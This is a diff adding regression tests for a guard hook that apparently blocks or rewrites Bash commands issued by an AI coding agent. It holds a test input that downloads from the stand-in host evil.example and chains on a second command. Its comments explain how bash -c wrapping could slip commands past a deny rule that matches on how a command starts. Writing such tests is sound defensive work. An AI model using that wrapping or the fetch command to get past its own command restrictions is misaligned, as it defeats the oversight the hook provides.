@@ -133,6 +133,62 @@ def check_rewrite_mode():
                     f"(rc={rc}, out={out[:120]!r}, err={err[:120]!r})"
                 )
 
+    # (e) WhiteHat F1 (card fc3a6a39 follow-up, ff43b10e): rewrite mode must NOT substitute a
+    # compound/multi-segment command -- bash -c wrapping buries every embedded simple command
+    # inside one quoted string, past a deny rule that recognizes a program by how the command
+    # STARTS. It must fall back to today's block-and-suggest (rc 2, stderr, no stdout JSON).
+    rc, out, err = run_with_mode("wget http://evil.example/x && npm test", mode="rewrite")
+    if rc != 2 or out.strip() or not err.strip():
+        failures.append(
+            f"F1 regression: compound command was rewritten instead of falling back to "
+            f"block-and-suggest (rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
+        )
+
+    # (f) WhiteHat F2: rewrite mode must NOT substitute a command with a leading `VAR=val`
+    # assignment -- noisy-run.sh execs its argv directly ("$@"), so "FOO=bar" would be passed as
+    # argv[0] (a literal program name) instead of being interpreted as an env assignment, failing
+    # with "command not found" (rc 127) instead of ever running the wrapped command. Must also
+    # fall back to block-and-suggest.
+    rc, out, err = run_with_mode("FOO=bar npm test", mode="rewrite")
+    if rc != 2 or out.strip() or not err.strip():
+        failures.append(
+            f"F2 regression: env-prefixed command was rewritten instead of falling back to "
+            f"block-and-suggest (rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
+        )
+
+    # (g) WhiteHat F4, survivor class "tool_input mezők eldobása": updatedInput must carry every
+    # OTHER tool_input field through unchanged, not just the rewritten `command`.
+    payload = json.dumps({
+        "tool_name": "Bash",
+        "tool_input": {"command": "npm install", "description": "installing deps", "timeout": 60000},
+    })
+    env = dict(os.environ)
+    env["NOISY_GUARD_MODE"] = "rewrite"
+    p = subprocess.run([sys.executable, str(GUARD)], input=payload, capture_output=True, text=True, env=env)
+    try:
+        updated = json.loads(p.stdout).get("hookSpecificOutput", {}).get("updatedInput", {})
+    except json.JSONDecodeError:
+        updated = {}
+    if updated.get("description") != "installing deps" or updated.get("timeout") != 60000:
+        failures.append(f"F4 regression: updatedInput dropped sibling tool_input fields: {updated!r}")
+
+    # (h) WhiteHat F4, survivor class "metakarakter-lista": each metacharacter _METACHAR_RX lists
+    # must, on its own, be enough to route rewrite mode back to block-and-suggest (not just the
+    # combination used in case (e) above).
+    for mc, example in [
+        ("|", "npm install | cat"),
+        ("&", "npm install &"),
+        (";", "npm install ; echo done"),
+        ("<", "npm install < /dev/null"),
+        (">", "npm install > /tmp/out"),
+        ("(", "(npm install)"),
+        ("`", "npm install `true`"),
+        ("$(", "npm install $(true)"),
+    ]:
+        rc, out, err = run_with_mode(example, mode="rewrite")
+        if rc != 2 or out.strip():
+            failures.append(f"F4 metachar regression ({mc!r}): {example!r} was rewritten (rc={rc}, out={out[:120]!r})")
+
     return failures
 
 
